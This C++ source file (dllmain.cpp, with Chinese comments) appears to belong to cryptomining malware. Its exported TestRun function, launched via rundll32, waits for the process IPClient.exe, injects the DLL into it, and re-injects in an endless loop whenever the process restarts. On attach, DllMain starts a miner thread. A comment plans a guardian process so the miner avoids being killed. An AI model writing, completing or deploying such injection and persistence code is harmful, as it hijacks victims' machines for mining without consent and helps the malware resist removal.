// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "App.h"
#include "InjectProc.h"
#include "MinerDll.h"

#define DLLPATH L""
#define INJECTPROC  L"IPClient.exe"
//L"IPClient.exe"
/************************************************************************/

DWORD WINAPI MyMain(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);

HMODULE g_hDllModule; //定义Dll本身的句柄，方便自身函数回调
HANDLE g_hThread;
INT g_PID = 0;

/************************************************************************/

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		//保存Dll 自身的句柄
		g_hDllModule = (HMODULE)hModule;

		//判断是否为注入的PID
		if (IsClient())
		{
			MessageBox(GetDesktopWindow(), L"found proc", L"Pid info", MB_OK);
			CreateMutex(NULL, false, L"Dlllll");
			if( ERROR_SUCCESS == GetLastError())
				if (createMinerThread())
				{
					MessageBox(GetDesktopWindow(), L"start", L"Pid info", MB_OK);
				}
				else
				{
					MessageBox(GetDesktopWindow(), L"failed to start", L"Pid info", MB_OK);
				}
		}
		break;

	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		WaitForSingleObject(g_hThread, INFINITE);
		CloseHandle(g_hThread);
		break;
	}
	return TRUE;
}

//通过rundll32 运行 Cli : rundll32 miner.dll TestRun
//导出函数

extern "C" __declspec(dllexport) VOID TestRun()
{

	INT injPID;
	INT i = 0;


	TCHAR szBuffer[MAX_PATH] = { 0 };
	GetModuleFileName(g_hDllModule, szBuffer, sizeof(szBuffer) / sizeof(TCHAR) - 1);

	//MessageBox(GetDesktopWindow(), szBuffer, L"PATH", MB_OK);
	
	//等待当前进程启动

restart : 

	TCHAR* clientName = waitClient();

	if (!InjectDll(szBuffer, GetProcID(clientName)))
	{
		MessageBox(GetDesktopWindow(), L"inject Failed", L"info", MB_OK);
	}
	else
	{
		MessageBox(GetDesktopWindow(), L"inject Success", L"info", MB_OK);
		g_PID = GetProcID(clientName);
	}

	//这里判断进程还是否存在
	while (g_PID == GetProcID(clientName))
	{
		Sleep(5000);
	}
	goto restart;
		//TODO 这里添加守护进程吧. 避免被杀
		
}

